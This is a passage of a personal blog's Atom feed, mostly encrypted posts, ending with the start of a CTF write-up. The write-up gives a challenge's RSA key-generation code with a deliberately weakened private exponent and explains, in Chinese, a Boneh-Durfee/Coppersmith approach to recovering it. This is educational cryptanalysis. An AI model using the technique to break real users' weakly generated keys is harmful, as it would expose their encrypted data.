427c794a794ce13992b5a4ce404d9daafecd3a3729416c5296358ea4e37fb59e2ceaed35a4dd031f983135b32422d1d69e4f334b2eddf3e8868120d21179761c7fc7ef483a58bf27af5f06f2a367577c59cdf176786e99d78be7bbca2abbe664bd64b082a0c254ab6664fc97279b072b1684edb75b2eb065f27e362e39737032d2cf50abf1b773e50acd7d9565e76c9b480aa0e577326c8e09c25b12af93d284d66f9bb3358b6fe1c29c0cfaaca8e3ae60030549c40e1b1ebe138448a7410e304bc24c6bbc5b8e4a23ea56c7bde7fdacd80bafead3dae02dbfb0a86ec72cbda804e844c577a849da6ae34356a3ec1213d53bba4f4eac6edbdb615884a92af8f43cacf655dcc4516ebeedd66bb0107448418d366a87e34511aac548b6c3f407d3f02f5dbd7438ccac569292ca2a8cd85b21dfee5ece801a8081b350019a3c9e3b6220fbff5a285de482c69221e7910fdbbaae398d43369054b10d547155b7ef341a54b54ff034e6e97f11489466e326fe91df964d33827355ef79e7239e01830e8171d7da88c0c0e2e7a620e58563fd0be453e3c827ae9e2d4e257b56f47693ddbc2d7a5efa5193fa59817e2214fbbc25a82d32f5fd4a73516881aba0c232cc7190611a603f261bf11817622e2bceb33fc2cfe024ccebb14569e5cc139ab8d9075f3eaf19c570acf5273de9a620eb1b65d0aa0a7555ae4afeb7ab8c9a54023abdeba50ee25d0b1a2469944d459d0f7e05a1e6f5ee8cadfc6d75874d9e06619096a145414793e878ce6df1afc2e435eeef46179d29d5ccfb5bde685bbabdf107d734ead19b0e1b0690b9548eb19cd61e73cbc329368185978182a4cc6dc045c90539b539f976863e7b7c4f486d128e4c1a4c212be4a679ef4d62d25b1235e879ee86217b36063f9bbc825754df9c6f7c992a62964340346665dd06711b2566debac415cc1791a066be286aaee26adbd288a9a9c0728f285111b561a3c01efcc00d247237e00761e7e7d778fe5e43c54a869ef45d6758c69a6d446df5684d09bb217a3b01f1ef6ff7ca8b9149e671f853d449b1dff7257a02d7021c9977023ea62da2f1822bfbf17ef72ee81ec6de9001a9f4568046dd0350dd6648d9eacfd45b92683408a9da708122bcd51ba144a2c0667eb45d4535d521d611d6270b609174d90f42688129154e60e23384db851451506ad5ea79d937a80b505b2f08c8ce39ed7727b4ba65d2a0dbec7eeb88843d227af83dcc2500264ec37705dee4eca793f76a06a24fd5fa6be8b5575c564ceaa28603f78c0fddce3f7dc74ef0c112193fe93901ed87b755706ba0c972b333e017b34d2f0c69377959545132831b58fe9a1a45c33ec5a345c6558fb8d099621c94dbf9880c250562fa4130c97bf6b41079fe2a1d2bc73efd844c8998226877e2720d9d4c833fd2a09e52e3e47e093d1f663ad8ff41db28842533c19c9e3160164cee01920d4316aec3b0af1b246998a463515dc24c0c8682738ac0f64c5c6ec99046a549e8cf274bd70a467a08f5e8f5ebefb8e592220b2108e715011eb65c9c4f686760f4c7de1b26720ef8f48c62db36dffb2c844c48bd2024e404c0129e7338dde10b1ded4e7cf1062c9b274b2ab1f4ff1ae1270fbd2d87bb94e0d2ba7ed38f64be0fa2cea64951648e954093dd50b165fce4cd364abd84b03867f8725e112c84a4f1825d38d63cc74178d26b191f9b1708ec3e084448d707250a0772ed95707f02a27b42830a8870d0dff08a7c4e306b5798b0f8940ef93a3e1d272386da1e7eb1af589e5177f225bd4273b28a135ba9535bb3b67a8db12dd7a28ac78573322acbafc0c84411350a6c334ef4f12a205c9b7319fb419286c8ba4216f4876d5c46f3191e7141b87e90ddee94ebeb418590b9a00773c16a2abe6aa20fbdf422c4641fd554ecbd575e6ddf1d3a86d58a3246e526f1e4ea812e5dadd4e8a2e790d569670f647a018bbd3ddfd3b6f848fabd3869587ff92d4df7cb77b319736e47128fba917f564a8fe479f416c725dafd4597814ff80d3f243d6ec22b427162bef036d0d5ef67e265b9835b672b51598f32bd9c9ae363377260f19a902b8028906656be7f05aad074dffcba0120b36de2b49a44312b8feea2fc5bb5294a354486de95b7b5e520387d421d5a3d2e3eca5921a4899e50a5c4171889846611b977e6afc4873d3177813b5bf388a5296177021f0334f21c64021ec61fe0a83fd03b1af2fee2dfba8ffc981d7960a5a4165171d2abdf4dffff4b2f82abfad66e47edc4145414d2a15474dee97977aaf1ae0db952d4fe9d66f2b86875f3ffc67485642e702b1168378c5b92393036b1105a8c93982a3cc93ac82fd127d093ab4aeb3d67d496e2f7fd1b08bca6f6068d2a9b7e0a8a3aff21aeb606ad00050bb8950c4f128f54be0f5f6871cde75424b5050d6a810e5f7fca14e95fb276c0059c85f74e22f2214d4d2959a2d907727955d981563f21b5d8d7050ab3521a8b1dc897f9292d9f1c97291140296c68570f7f54a72efbd07a5dd93b37d00c386f230e39131b650cf5bab20353c117f448f8eac938361911c8992c945f98c06d071f322019316eab83e4169cf82708bd12bded24fc15a8fad4bca1a87ec0befca611e71d205d58b271b8cfc49133a715bbe53bb670051576fde1c8f4fe7245d400d6c0e0a94591f0a377c3e952844eaa9f5fa707404b21fb975c05b7fb24df730c30446448640a7dc79efe933f2dd83d151f5504aae91f85dfd7a7afba4b2e9c5760efc57f71cae3b2fbc4d3eb81148f9091e9e0e0229f82f4b69676695da01d99803143b93dcbf45128acc054b4bcf77fe3c4236501705ce6e1bb2da2aa19a7c5eef260bc5bd2e6bcfc86bcaf235fcc0bd63dcc65374a8392bfffdc6b67e4f565fff612c37e0d0a580f7322730e684c47f7c2c7bc378df27db92fdb79855a41e49ce0fa7607afbacdc38ef0d79400fc9cc9a8c763650d8cb2dc0f39ed4b065f41cb01ffdf26e268fc5e8a96c1a42ee316faed0bef69bc38ddf95b1d9c87fb1ed75fd23c91737c5cb634e4ee772f068ca87820cc84e5213833e2159acc74cbb6de9902d24bcfa2626a40f52b8b25439250de0b2f3873ef3b853162fa0ac93b35789b36902563f4a2e868d14b213f3bba777f96e25f64fe9d723abbe4d9949ccd6a7d6c8f935700e5aae707873b917feece32cb4c9cc63e9c334f293d03408e494bffb00b068a60796634f47f26f98196e2247ef471d86b849d4380c04cc0314c1213fcf8dba831519e4cb2cdf914cc6d9d38468b26fb21dbe3f149e8af1e0c295d829c1b95b5f1e24839148ced8724aad1b676dae7c24d1025f067a4a6ba1e3de3720ab7812b55ecf16ddff4b73ca29fb6a22c629ca52ebeb2c5c6ee25daa03f19544f84eb6f927c80ff6c7810a8954f19d304250ffb6eac1a1b8cd29d16c36374acc6a89e8eaeda5e14c8094e20ce7a43c94b335af13417be4e747e54373d5e62f63d8706c2d7e29f57b0ea88648373d7634252372a4886662767e8830570d3b62f72beefb8b00f60c68c907e3f4d0c96d0ea80953e245f7889f0a65abd10c2559b52f2bad0ba92bb54f6521b3f4425ca58a8adfeb2a56764c2d3a8d7a1d038d47540913d82ee452e07c0c3eade65bd88e67dff24b417b915874cfe36416a0b7374e970e7f00a9bf93b8cf4b0740a9ca51eb336b21be6f5e409ee4e60f11c9ccdabf7dfb50fc2613daf27e290b58a71f2d11d4de2082b2c3dc55268294b96d62313af74796e95851c39a6548fc4055b7ca566505f864072d4c69e68714c1aef39a200448f86c749290cbaa407d1fe911efa256536323feb7a7f73658cd5de00321f02e6d441a649343147226e9806a6bb0bb713fd45441c8f81e14a61a37e3dc6d5ff6b4b3534cb0b4bc3077c5797710052c6553f5a6d01f7c0dcdc61e8bf1c91fe48497657080e8cbff6beefcca9f19ae7f0ca60703287219109f565c1e0efaaa4c74b48169f8a6d17d3a4d626c95d27225ee5ae70bc4521c8e1984b1c9627a65979206a19bd788781bfd3a5af94c722fd5ec6b9dfbdb2047d937b90eff66150bd0b5f920f83b6244edd7f2b0490ccc784d0bcc4c6dd1dfdbf84fd46a78fba794b68ae4bce61f71ef0ff0ff31bc6aeef4a4ac4644afeb0f27e936eaa4bff76e9b679087ec809c876f1865335e4de34c46fc3211cd6d49752a2ae8506c9765ca394543eac94e3477f376a15a4892a1d54ffb051a30391bb4edb5b3db7c7340e3dcf7af32e0b5c9af09c6e2fceadaaf28df1dee336a516427aaf5d8d87c69b1f119ccc680287604931cbc42d38cec2cb9f20d6ba9205721c906837df0f1d07fd36d0dff64aed72583d9dc39c5d6c4cba6d545560530456799ab7a8b0fc097be616a42d173aed6c3e03cb2ac08c88626e6410a30c744ea5b1be91ed6fc722255ac736aaf6be45540b585826afdc69dbd0972d2e3d5cbdde7671a8b190bdf07944db8e8d4a5f63a846e1b2c419389269cd8923d94f715ab11569372bb8b44119ea4de80edba491024587d74fbedaa4db2b15a4bc8df7573be317ae06202ad0a3efef87b5a598f99602f6de4b79b6bc38d34f7da33c63fba14204ea3a27289e9bc3f5171a8237981c0f9023f55aeaff8d1b01e2fd2c3ea3a9a5347d4e395c2431d6a1879d17f7a5c3d3561d104306debc67f1da3babae195b38f1dd64476105b925561ef10d974e2b5b1785aa75de477eab18f020ccc57d29648c9a4e2a8ef2bd0bd316cdd2dfad631e36c26f0cd18bdbfc6f01c072fb212d1f45659ab49831117af6bff18a24aafa833497a7e8379d9db556c9664182a6718efcda8c4bc0ca9edaf0d1902935b909613a33ef6d68b1c3fcba1c957a236aaeb0480afdd786c412d8cd5eb47e880cceab5dbafd7b674b7a182fc89f36741e31909b12f71804cd6497fb9ba9a5c8ce0b929ba4c70ac262bff6cb109c55b083b7dbc8006aa79c6af602f7ec972a317e4661a4d049b124b89e34e6607532abf8f8d9f86f36dde912ef8574442315ed65fb449677e0b7c0a890368fde628b000482af73a98b204eea348516e8a77d9363d9f982c5bf5a30cd784059f6937321887935f038882f0372d2fadc6fef25466510a0c7ff158ca26401feb7cba33757b2fb4014fada7a37326f1c0ff729a935c520aad36c2dc154a0ab2de657edb9a0d90a9fb7f72048bd0fe87a92e9028676e786989404cb03c730e0e9619950fd8a9eda396abcda137bb877350480f0a65d542144ba2d3c39cf639ab31a24fce7f491042b4df0590c0d10a5260f742403f81e9e4786c1e5bdaf1677d87b3b3824f7dd6543b49b8110324492bbd960b235c76e35205fa9c443913cb68efdac77e598dfe9e629a4faebdd0b4efb93662a2268c047a5eee881ff5f5373fa818143bfec4076d7f8c40885afa4d316fa91234fc15f2910562b9bb5bcb45ec9da6e6d628bb8bf072637dd7881ce81ca17c93dda3217aa90814f741f7bd35d8392b3101a4511dd281082cdc72fd941fbcc21a757d78f1c987d52ac6fe54d7682dca938d78d78028ac48c081c97494e86d7a2d20ad29d76f04e4d5f6ae43302f39454e916655c2bf472f01fdc7db955e3335fd24ae1a4272d455e6118cfec89c5d0e70c18137336f7de955d4a148199362e363773d4a7a6d99ea64f402d1a11a992e2ac28b76dbdca2f272d52c7b379244a516cf28f0511e6eba284be348db095d711e82a986b4b6208a2cb44dcff67ae3bb2ee87878df295913402deea1e449512177c97f74e1abd893181a8da082fa82c92911fd12a716be13dcee31012acd9fa2c068c88a25501080cf2121917d6c642f2ee1154d76d917c85ff60ba512d4e1b08fa2d58f4e09eabb67330af5d03a49e44b816d07a1743e05f9ec12f7e331b57b7000232a361cfe3a7e3d32f22e58811200d5f900e7ca0d6e176c78da726bd98b6770a960d1e2622e88954e1036497d0ae0b41acd75705b7c8d2cde15b3c148d61386927bc04e32f30edfcd27d1ddb8d6436271d4f8893ff59020301e22e76ad0a99dd9c5444c2361dd2b90643613985cfe9da5f8829eb0b24cdb0890a391a997811e1f5c7c82041dd3db0727b58ef338ca493f11d955354105763f64d88428d73f9706a4d29f9db148df3b78cb26fc20651234886af665b4de95915e5654653cfce1106e87070aa2735fc54d36529e8c2a008e1910095acf48ddec82567813846852e6249b478ef1423a2398a0b9d3e18806d2372f010788af78d080d1792fc8f4ecbd6f3628246eafa7e44d5fa8aaf7f3a92cf461c7d1e565f5eb24633a64dc207d0db79eff7ace3be3d581b0e686b12b6b5af461c2613251b8e25aeccf167e80a51d5cdf4e4cb70388caa02a70352327e22e40be7a6b7d070970d8203c4c30ebc9fe347692551ad1c88b1860ea7877819b081824656eac4cab9e9e60be8b38682ce63ac32ae4823666604347f82c0880c72b6fd03edf0428c0d61540adbdc5f110a07be214ecededc39eba20cb135d9ac56ea59dbac4ed1f55e7102c3e5916d8610894c47f33d384056dac54f4a9b227c581a5425d5e21e9127dee3c3a4da97d867599976ee7f10b2d0f4713199afac8f3e248b769182b4c408d245a5385ab17cb103709984b0c2a7b1943632a42656023f6bba7776b637e0cf01b549830bc3799f6cfba06df29afe4b9be740f6af64b4bad8e099e15835e110f76acdb03b3beb55ed313dc029c2ae8957266ecd9eb099d01602eb7cf968457479dc193227e9b0b7a3f4b23a2719ea7cbc8403ba0df13ebcef21a65bab1a87f19f1e1df3d9d78c3b272609ee968c32fd7ead0502f9c5b9c102055eaec89b26d78d535bbcea79785206bc3c29c35131a171bcc4e626d6c885c10cb5eb7a135cad74243f47349eb0b291b225ea393fa233ae1dea4aca2c86d91aa8b2675fd1951c8d6471d64f088cf5b1cdc505e8e2276511bf261d798bf723bac8c51eef005ca89a9abd935dab6ac234125b1dff202dc3769e9c0630dce14b5c136b4fea6459c72c21ba9b9fc59c883f7f193cbd582c231af8c2e18c1f00da6613d9d3b9aaa928a4c1c623d00905d84f4496cadf4b8ed740794eab02c0ec876391589bdf742f3bc5c9df26a1ff8038bd129076ebde210af0fd63b987cb707eb8191939aeef50efe9158b863cf3b88e5b89e599cf98fb0ec2dc6fc60259564d42a6ec394ded25488580766f67a517dd24e7793f6d0ee83039181c5690be4b87b73241f69d9a05794a5e7ed3afbd5d15ef8c4a926fb7dfabbb5c28b64e963b36744509b3642d26cb895530045eab6347b14b6f05910a749f68307e4a5073b8a2253c70a67be39a31adcae6e9d050b7afa827e4f891b49a5931e805c1cf15c49c9bf06b63316ff5e3b54f94184008d859102115dbe842d8d66a02ae3daf271d2f9a2ce7f324a282998fc46d28033a1e7efe0c02d4187fe288265e52655498339d950fda92c5a14450877ea35403c54aef9090b463501a2858d17921a8c3ad16d374704ff4dd93bb303a6b23f70c9e4677089e82e4350ed18f54d60b30daf1643b7f154ecfe5ab775d063465670502c2b12c73e2711cdb0970a81df04ec52e21a189854a450e00f0c7cb5eeab1e66997804354029671df82664bcd4a34409d7ac97744d9bdb1a2d5787ec8774432dced1edf8f133a458fdd40e4096d787597cc6e6a87fcbb5726393d617426dcd3cc86086dcf99d5e8b391976323268a0329c292131d3a5cf227da11906342dd6bf7db486403f5016a93aefb2032922b1c16fbf591d59ecd94e095780ec6c9431bae41d949897b9cca2cde2181aa26a344cf4695873a490b317d0db324635a6c167e46b7c5ca8ff7dc0b9b5b18bc81b107f7a71c4a3c3e5f83663970fe6e2def51f853e5451c73f1aa037b686641d547bf2ea366395b3a4b18837d2be784fb3a273c444c3fa8c90d9acb277443ab4970412e9bc7dba4eaffa1b317e222982ebb99bfb6a6d6ed3222553252bb7398e998fcc11c62a97e7601f02b48a407f628eb2eb3b3ba8e6bf11a1790efd98658d0169a18d2508dd574dd54e105df333d7932176cb17ed2cc91249643ce6cbb1f5ca945be0e4021575d8b60bfd6725e8dbaa0b9d5cbe11a4bda6055d0722acab4acd78aa581e7a4fb87292b7bc8d9bb8867b06c42c3742e1f8779c9e48a08a335de178c95fdfbbd34bf9325a3a3f854413fdc4c9672ca49b94bd857c192b57d720833f35e3f9639e6c9b0a8662b77567d702918e4f65436418cf2d4962425ddbec66890466450e252a89b8e58c7a02236fa48fb595c2a789602b424035f28b8b07cc3b1459cceb830282ea20496cc4a55851fa5772f75215300c48b478c0f62c662d7a49377a313a96c95c7dd115e17cce574c2c311eec95c3495bdcbf18f61f0603c9887f049d99923b3fee754df8791339775da7c2a719d39f5b4de05ddecb8c0e00b623d242642130acb9556742b3e4a0206615f49527b82434bb4abaa7eb3e0c333822a871d4c1b6ee0d979d680513889ea4a250449fdc40189a56d23fc5b1714d3c4c9aebe3dfc9b39a3ed2afe944b08d8bd14d069b10a9ce2a1fc5c89f6d925a584777d8dd1f8cbd25aa6e9780ec3189a984e60682654d38418a3080eee643a8891075c765b4125a3521b147c2b8ae57eec630dd223870b20cdc9e21ae87ad33247433c2e3a378b86c595d50a0dd50abd7d2646428492ea77b248fcb605dacadb9dc00c75bfaed4bc8148537c977a168ffd1e043b3953d028a16e922faf6008829b44a94d9a9ae7bf5c1589dfde31d78c357a6fa507642275308d538ec1e9a3450d247067ed5d094567f68feff6a5b5c09a249763e39e034d156cc683d2d52f74db8333572257494205638e521d7bb536b30caec3f1b848c4ac5e906fcb9ab0858d5e7fc24de8948fa503766eb0a0b04387acd8d462dfce774053fc1063880a9b557ff82f9310ef66344d3435b471f5a05b74f3248d3bff617633bd3a548526705931476e18a50c0a27057dd0e3915c55e52055c9cad72b946b4a67fdeb08d583ce12d2c2c2011cd4cbe7d29ecbdd42e9ed41bc77fdecb23bd08d1424626e4e45232238463f961ff70df1b3ce2b3a773b4e341563b70c9d9ed672dff84ba36c663ba58fb9c89a127b236c5f54772e1ce69f9b795caba652e740d3ddbc75061fb4c4979e3aed90887ac1c0ab34722374915f934ae3fd327ca74e29ac41af11a64823527072599a975103811b22a1ed38e4cd53d90bb3a7b94ba28171d2fc1da0ef8dda2d775bf4770c3ea6137d44235f4a71c341a3fe5e20491c65d46688bbe417b45e03020f2de328285dc9f1782aa3314f0b77c4256c500f2abf244b685f6ff53a70bbb67973c5b493058ee42b025af17e737007693f3c20b545aaeabf4ca9b2506256f3bd348588de1f76e2690d2289b57fac1f52fd5e9b30cd709e2459d679bf792b93690ef6761be52283a327dc611af0ba78d1fd813f1e5d5f46fd5ceb67e76e544d980dedf75e066bf8cebece5d860eddaf8bf1f54dc0a38de88dbd3910afde94db203ac2f80aab25427f29f2db005942aa94c8e9e76bdf1099aaf9f5e21e9e237b73d4e6d0a2b63d5e983616a06bcdeec692bfc541b9c55baef59c408189d626796ef4c38ba74a52e386711de006920c16e9d0ed9178db360ae00a090b53b6e2708b5a9e0ec7215c8a0823ab4f4951525c4afe6ea961ad3688ecb820903ff54d8b75b6f9d27b0c188891ea91206c9928743528ac5b60fa58654734bb2a8b1578e36d6a3feeb11c083d137a927b81a07ecd012b55940f95a721dffad9b73ba877f6dabcc2e9874524eb263697680537dd7d245384ed43a9ec9a88e8087817ea6a1eb2fcbaeef318fa5f2e5349bf412a7f1c30af499fafb7b7ca85b31a43a13d4697cbed25e86cfe81f674e69a8df08d08b2af664fa35c6cbc87122e8378dfc8163b1343950ac8851124b8bb8440a6a3af06fc7bbf1de3d952793df5a0b2cb8af5c6c4f2b342647b2c32eeb2f6b73f9aa0ecd390502c47d05c34502eb5003cabbf0d43965cc598f71c4af98ee0e935c8d5e5d6fb60e236ea572d68824a45a3613bf6175f5955c5971ce7c0dee14e484c05bfc30916d081f96e153944d837983f2715c54b75a60d4f5df9d6fdf4a56b348901edbb53b8841f065f6b3e96437ffff17563ac3ead472302e5c0b36f7153bace9a20847f6d4a9f0d8d53ce1c5814b0808756c5735ba0526a524c8ed66bce1707fe71646b7cf05d33bab6d8622a45024d6e643e95933606b6e53495162b8fbbe21779c60d8905a618c8007960528c88d01a56f26e617af318a96e4d73d318b5352392e5872fdda0067f22f96b728f369a803a9cdd8921da85614d78188155eabe18cee14f3d777de62c3141eb9590743e961f951f4e1c349cc8997b4f1c7f095b46c198672f2f75f67b4968913ce09da9865ebc28eca26c3dbd681429af8d2bef8383bf8953fbe4a72bac61b39a5106f90e9656e9d77ae3a1680c0691d38ae62608b8dc200c7511a2a44f54abc36dd2741d4a5481ad498d48f5466d8a4e9ba4e5aadabec3853c934aad55d46724210cca34bd0bc97a58557489035f8ac8861c3861a136236d20340928d9acd3fe402d8a013294bb906a704165a2e07f7f212f0722b25f31a34cb6ba61285f8814ef80b4eedb3862b1b3bbe021f39cbd5d084bfd986b1ff42ff94ba7a5bd3aced68c2826653e21b6be45d5ca3a18709aae53f2ada5e282fae187a21d1a62bc2234db7246d1f9acda1bc4fbcb5839a9f88e1886cbaf4816e0dcd3a9a57bf5fa735a8865ff146bac2ef1bbb4210db70ed48043cf85f459f2bd3dbc0227a71e0488fb4ea1e1e8ba137517dbe60f4a3fda8079b4f8a229b99471e6583ea986c5ea2aea68f41c06e12a00de439043d85b4cc10dc68a872a5f341f2f07743c9083dacf2f897c10d397309e5dccdb9c037dabe047c854be55cd085f8e636d963cac3e56b5049ac4a0dae36e8e4a767b4e4291497656135647c3f77d7fed09d7b5e51d6092bd5d9985142e069fc16599f6648cb13f2d88908168c6f0b1ee4b782b0438c890496103384a55113fce1107d9d5cbeae21cfa0ef7366ee310d04d03d66b58a591b68ae06293d1e4e36f01890f83ddcdde066f218e59a392d406207a8c1ad7a5aacc5610e5f94b50ff9453fea77cf0e5d21f6e961773e6e8603d3dba36d5347deea7827d51dc25330231530e99f3a0d43f51c0edcec4668e5074330c77fc7839883f747a260a89bf41a262d8e5221250a5239249ffaeeada46949ee38f8b239b8e4e6e59db5b280a73a993d5312564bea97d598cdd7303a29790e6cf7773e701a47af2183cde5a32cfd0ff194e1f430d75b1b9965a94d4730179bdf6d046a5453c84609ccfb8ed523d5fd66746df1f055529b429582552bb0b1d253ddd929e12a5c35dc92a8523d37f2321ba4212c9e655a9f8ffd4c9cfc01c358a30aebffa84e16b693706e75123ddb680c3775abe79bd114fea5b7efa0c1ac884d94a2701da38993dea01261cb389a527be550f1f18fd7dde715f6a34954137995d1507266ced401f8999f086f83059797082792db86a3fe6b8d447312b8d78b2883661797c6791377f13d209cadaf6a9c987c925ec23ac209e9a706dea83dee520a65c820e03d74374b11f541806ee3a082f913f18c0fa6d85652d073092c3b71d105ec8887d01ec0cf01a1d15f63962befa43b9087cd98d8b0f3029384f8a37384efeb8c4f818ca85609dc277a20b3ba0fd5b1ec9755d908a08834cc314e6b52575b7935e7351a44a4b04f3c534092bc1293feb00eab98082a2380dcac70e431acf74e959ecaf9089b3f15991bbc7159b914050e25fb0a1d273beb2852f6777eecdbeea60bc51fa97b9f1631f63c98e4fe58d4db6c9485149ccac0c0fa32b1f686f6b2d41feca96692b421a4b01ac0fff39749e36521a39b596612d7477c8830e461f4747b1400be462f19e8bc7acaac8bad089aa38b33beced0b0aa9e946bf56823df110955a8ad8d7e800a747dd7cc4c951488f5fa393646ba3c2ab03c977a5fba2101e66f57edc4fa1845494897aeceecdb78b8a59176afeb22a3d3f3a0b03848f23742950a70f38</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">出了一道题，适时公开。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read :).</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Days_Without_Internet</title>
    <link href="http://example.com/2024/01/25/Days-Without-Internet/"/>
    <id>http://example.com/2024/01/25/Days-Without-Internet/</id>
    <published>2024-01-25T15:06:44.000Z</published>
    <updated>2024-01-29T12:00:53.575Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="43dae15dd84a7a35b945a9c6cc46d8422ff415bf3a82b32bc139f494b41eef87">1ccc3afe3f8e8a6933effeff5e279474dabc45c9513abdcd9350e81646bf173688d54434ad4284470f65ba32ff04289492cf5a1e6795ece30ff512a23bb7e12f153a6c0a38e1b83bbb6babc028ca2ae5004d2140335cedff1612db32161b307824c18c5886b239d3968da245ef2b30130364e824578382a79696001fff110d66c0431f17690435b008aab19b40745abc1a30939aad8058ca1fb25c641fa4f848bf6a40312f3632f4c68c70913a84cf265f1e0bc9febee50b8414ef18b487f379f6a3cdfadb6089e1c411c3be136f65b448b8939f2ea1471d7e0afe5f9025a69eef955f7e749edc9f027c4b2eb38cabb17bde3d0d51e9c47b1e62ac97eb78ee7892c8485813b5b08de9d2e128b551a8f417e7ce35127c0298c9f4222279e6e9e2feb0ff567a704abaaf98629cb2d122c529c8f4e944bc247516d21d4d001f27c0612b009b37249509d41dffcca92031cb360cf3e5ad5bd60b3b58f6267441ef2720edfdecf201ed6119210f92a96bebda9267a269330a502fb49925607600138ff964257d8c0cab265eaa6d556b3b7c2d5a4706ecfde29690a3a8534ce8081ca659821115702d75f6aa660816b9005ebea61700120575799ad8ad87c99b9f5cefb698cd3cc95ad96e5e26d614b94194638a9e6225839ae567361bad6bba5bfe9dfc1aebc2e8bd671bc6684a6d33893af7ec1c0c0f588e180e3ccdf8ab495d59abd4cd3e6a2683f43c396cf8e77f559f6469879aa89bfbb79adf2e4c6fbe66db5307e782b99e7b913ca52096ee7bd1fe304905dbdb8a78b2003e0457f5d66dd9edbc6fc8a474924881333cc09f0c6f2463330759ee819fe384573e8da398f9ca33db9ce07e46f3dc0dce108c44485549ea4d89cf93a4c7fd6d6acb41ccba38dabf612290aa9557235d146731a52a0e241f19319bb9e6b9c0399cb166c473cf065c8c8ef5ae64909ad8bc92de99e89f42d0d72b0c1333f2062e487b3ef0fa151e48091656e01a3cb1fcf90dcae299305dfa71342b2aaed62c710e732f2acd1391ebe8851b753f170610133d466f18237f400c103826809f0cfb1d7588d614b9c15573615ae93bc81742ff3a9691fafb2b3d8799192185a33ebf071b7c0029083802da4c75fa4daf8fcf384bd1d1bd2abce1500b888489b4379d1e0669e9502e3dcc7b6894e2ada71a0f75b57eb1d4852712f7d0c53f92d3f3425e739ce298a55f4289f442a861600055fb8026693d283726b8ce5e1ca34108337566e8b28bf40a8e762f94e4ae43dc166147de258a1459541b15fa7c5f47e89123de9b3469e355745b245fe7857f8f34316563b5c6e20117ab1a2284329c530b0953de3a2819f6bdb114f9d0d3235ce497aeb9e4a7f422577b5225a92b273b98d62b9e58cbe343ca5868ab0c553bd9faf2e15ccd0880d4c6c276668a97d7f5afd353438aebcbe6140d5c5166f45407c25f11c00a8c7b5e945867ca9a2d3999823c43ebdae1ec2f8407c3c9071cf35b16e4b0b450aad5759d7cfd8fc3c12d083ad6a42a50e6c9291a48c62ea2817a8ca2d7b19ee3ea7fcebab8697f2b0572d478e53427c2ba6d3309a89e88b1522db6f987733b5a38393cca64af98e04caeaefebb2bc736669aff6a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码阅读捏。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Enter password to read.</summary>
    
    
    
    
    <category term="Other" scheme="http://example.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>CTF_Notes</title>
    <link href="http://example.com/2024/01/22/CTF_Notes/"/>
    <id>http://example.com/2024/01/22/CTF_Notes/</id>
    <published>2024-01-22T14:09:34.000Z</published>
    <updated>2024-02-13T15:56:39.355Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>[TOC]</p><h1 id="0x01-Not-Wiener"><a href="#0x01-Not-Wiener" class="headerlink" title="0x01. Not Wiener"></a>0x01. Not Wiener</h1><p>题目是变体的Boneh-Durfee attack, 需要在理解攻击原理后做调整。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = phi - getPrime(<span class="number">540</span>)  <span class="comment"># make sure it is big enough that wiener&#x27;s attack doesn&#x27;t work</span></span><br><span class="line">e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于<code>d = phi - D </code> (令D为540位的随机素数)，比正常的多了个负号，故要做一些调整。</p><p>列出RSA等式：<br>$$<br>ed\equiv e(\phi(n)-D)\equiv-eD\equiv1\pmod\phi(n)<br>$$<br>去掉mod: $-eD&#x3D;1+k\phi(n)$</p><p>两边同时mod e: $-1\equiv k\phi(n)\equiv k(n-s)\pmod e$</p><p>其中$s&#x3D;p+q-1$，k是与D差不多大的负数。</p><p>考虑以下的二元多项式：<br>$$<br>f(x,y) &#x3D; 1+x(n-y)<br>$$<br>可得$f(k,s)\equiv 0\pmod e$，所以(k, s)是f 的一个小根，可以用二元copper来解。</p><figure class="highlight 